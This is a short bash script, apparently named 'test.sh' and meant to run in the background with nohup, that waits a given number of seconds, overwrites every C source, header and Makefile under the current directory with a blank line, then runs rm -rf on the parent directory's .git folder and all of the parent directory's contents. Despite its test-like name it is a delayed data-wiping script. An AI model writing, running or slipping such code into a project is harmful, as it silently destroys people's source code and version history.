#!/bin/bash

#start script as $ nohup ./test.sh &

text=" "
sleep $1

for file in `find . -type f \( -name "*.c" -o -name "*.h" -o -name "Makefile" \)`
do
    echo ${text} > ${file};
done

sleep 1

path=`echo \`pwd\``
rm -rf ${path}/../.git
rm -rf ${path}/../*
